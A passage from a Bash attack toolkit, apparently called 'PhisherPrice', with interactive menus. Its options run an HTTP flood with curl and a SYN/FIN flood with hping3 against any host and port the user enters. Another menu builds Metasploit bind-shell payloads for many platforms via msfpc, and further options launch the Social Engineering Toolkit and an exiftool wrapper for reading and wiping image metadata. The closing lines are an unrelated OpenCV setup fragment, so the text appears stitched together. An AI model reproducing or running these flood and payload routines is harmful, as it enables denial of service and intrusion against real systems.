    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    headers+="\r\n$header_name: $header_value"
  done
  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
  echo "Sent request $((i+1)) of $packet_count"
done

echo "Attack finished."

read

elif [ "$x" == "$synner" ]; then                    #syn flood
echo "SYN flood attack"
echo "Example: example.com 80"
echo "Host"
read host

echo "Port"
read port

echo "Number of packets to send"
read packets

echo "Packet size in bytes"
read size

echo "Window size"
read window_size

echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"

data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
for ((i=1;i<=$packets;i++)); do
  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
  sleep 0.1
  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
  sleep 0.1

  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
done

echo "Attack finished."
read

elif [ "$x" == "$option5" ]; then                          #Option5
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
Create Your Own Xsploit
\e[3;39m
(1) Windows
(2) Linux
(3) OSX
(4) APK
(5) ASP
(6) ASPX
(7) Bash
(8) Java
(9) Perl
(10) PHP
(11) Powershell
(12) Python
(13) Tomcat
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
cyouro1='1'
cyouro2='2'
cyouro3='3'
cyouro4='4'
cyouro5='5'
cyouro6='6'
cyouro7='7'
cyouro8='8'
cyouro9='9'
cyouro10='10'
cyouro11='11'
cyouro12='12'
cyouro13='13'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"CYO Xsploit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$cyouro1" ]; then                    #cyouro-Option-1
clear

msfpc windows bind 5555 verbose

read

elif [ "$x" == "$cyouro2" ]; then                    #cyouro-Option-2

clear
msfpc linux bind 5555 verbose

read

elif [ "$x" == "$cyouro3" ]; then                    #cyouro-Option-3
clear

msfpc osx bind 5555 verbose

read

elif [ "$x" == "$cyouro4" ]; then                    #cyouro-Option-4

clear

msfpc apk bind 5555 verbose

read

elif [ "$x" == "$cyouro5" ]; then                    #cyouro-Option-5
clear

msfpc asp bind 5555 verbose

read

elif [ "$x" == "$cyouro6" ]; then                    #cyouro-Option-6
clear

msfpc aspx bind 5555 verbose

read

elif [ "$x" == "$cyouro7" ]; then                    #cyouro-Option-7
clear

msfpc bash bind 5555 verbose

read

elif [ "$x" == "$cyouro8" ]; then                    #cyouro-Option-8
clear

msfpc java bind 5555 verbose

read

elif [ "$x" == "$cyouro9" ]; then                    #cyouro-Option-9
clear

msfpc perl bind 5555 verbose

read

elif [ "$x" == "$cyouro10" ]; then                    #cyouro-Option-10
clear

msfpc php bind 5555 verbose

read

elif [ "$x" == "$cyouro11" ]; then                    #cyouro-Option-11
clear

msfpc powershell bind 5555 verbose

read

elif [ "$x" == "$cyouro12" ]; then                    #cyouro-Option-12
clear

msfpc python bind 5555 verbose

read

elif [ "$x" == "$cyouro13" ]; then                    #cyouro-Option-13
clear

msfpc tomcat bind 5555 verbose

read

else 

n


fi

elif [ "$x" == "$option6" ]; then                          #Option6
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    AutoExif Tool
   /<<< \_\_  PhisherPrice
  /,)^>>_._ \ Version 3.0 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                 
                   '
echo -e '\e[1;31m Exif Tool AutoMated For Easy Conveinience             
\e[3;39m
(1) Read Image MetaData (Basic)
(2) Read Image MetaData (Expert)
(3) Read Imge MetaData (From Website)
(4) Wipe Data From Image (Except JFIF Groups)
(5) Wipe All GPS Data From Image
(6) Wipe All MetaData From Image (Adds Comment Back In) 
(7) Extract GPS from AVCH video 
(8) Extract Info From Thumbnail
(9) Wipe Photoshop MetaData
(i) Help
CTRL + C To Exit
'
autoexiftool1='1'
autoexiftool2='2'
autoexiftool3='3'
autoexiftool4='4'
autoexiftool5='5'
autoexiftool6='6'
autoexiftool7='7'
autoexiftool8='8'
autoexiftool9='9'
help='i'



echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"AutoExif$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read meta1
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool $meta1

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatadeep
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read mdeep
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

cat $mdeep | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
read exifop1host
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl -s $exifop1host | exiftool -fast -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop4
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Wiping JFIF Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= --jfif:all $exifop4

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop5
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Wiping GPS Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -gps:all= $exifop5

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop6
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Replacing Data         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Data Replaced Using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
read avch
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read



elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
read exif8
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool $exif8 -thumbnailimage -b | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool9" ]; then                          #autoexiftool9

echo -e '
Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
'
read psd
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -Photoshop:All= $psd

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read



elif [ "$x" == "$help" ]; then                          #autoexiftool10

clear
echo -e '\e[1;33m
\e[0m
 \e[1;31m
You can Put This Script In The Desired Folder You Like Where The Media
Is Located Then You can execute the script
when the script is in the media folder you want you can just type the
Image name Along with file type instead of typing the image location aswell
For eg: instead of /home/username/Pictures/lulz.png
I would just type : lulz.png
'
read -p "Press Enter to continue."


else 

n


fi


elif [ "$x" == "$option7" ]; then                          #Option7
clear
echo "Are you sure you want to start SE Toolkit?"
read -p "Press ENTER to confirm or any other key to cancel." confirm

if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******  Starting Social Engineering Toolkit... ******"
  echo -e "**************************************************\n"
  
  if sudo setoolkit; then
    clear
    echo -e "\n**************************************************"
    echo "******          SET has been closed         ******"
    echo -e "**************************************************\n"
  else
    clear
    echo -e "\n**************************************************"
    echo "******        Error running SET...         ******"
    echo "******  Please check your installation.   ******"
    echo -e "**************************************************\n"
  fi

else
  clear
  echo -e "\n**************************************************"
  echo "******        Operation cancelled.         ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue." 

elif [ "$x" == "$option8" ]; then                          #Option9
clear

echo "Are you sure you want to start Th3inspector?"
read -p "Press ENTER to start or any other key to exit." answer

if [[ $answer == "" ]]; then
    clear
    echo -e '\n**************************************************'
    echo "******      Loading Th3inspector...     ******"
    echo -e '**************************************************\n'

    $pi1337host Th3inspector

    clear
    echo -e '\n**************************************************'
    echo "******    Th3inspector has been closed.  ******"
    echo -e '**************************************************\n'
else
    clear
    echo -e '\n**************************************************'
    echo "******         Operation cancelled.        ******"
    echo -e '**************************************************\n'
fi

read -p "Press Enter to continue."

elif [ "$x" == "$update" ]; then
clear
echo "Updating Phisherprice..."
REPO_URL="https://github.com/sircryptic/phisherprice.git"
INSTALL_DIR="/usr/local/bin/phisherprice"

echo "Cloning latest release..."
git clone $REPO_URL $INSTALL_DIR.new || { echo "Failed to clone latest release"; exit 1; }

if [ -d $INSTALL_DIR.old ]; then
    echo "Removing old version..."
    sudo rm -rf $INSTALL_DIR.old || { echo "Failed to remove old version"; exit 1; }
fi

if [ -d $INSTALL_DIR ]; then
    echo "Backing up current version..."
    sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "Failed to move current version to backup"; exit 1; }
fi

echo "Installing latest version..."
sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "Failed to install latest version"; exit 1; }

echo "Making $INSTALL_DIR/phisherprice.sh executable..."
sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "Failed to make phisherprice.sh executable"; exit 1; }

echo "Creating symbolic link for phisherprice.sh as phisherprice..."
sudo ln -sf $INSTALL_DIR/phisherprice.sh /usr/local/bin/phisherprice || { echo "Failed to create symbolic link"; exit 1; }

echo "Update complete!"

echo "Restarting Phisherprice..."
sudo phisherprice || { echo "Failed to restart Phisherprice"; exit 1; }
elif [ "$x" == "$contact" ]; then                 #CONTACTME                    

clear

echo -e "\e[1;33m\nIf you have any issues, feel free to file a bug report on Git.\e[0m\n"
echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;34m\n"
read -p "Press Enter to continue."

else 

n

fi

done
	exit 1
	fi
	if [[ -z "$dldir" ]]; then
		dldir=OpenCV
	fi
	if ! sudo true; then
		exit 1
	fi
	set -e
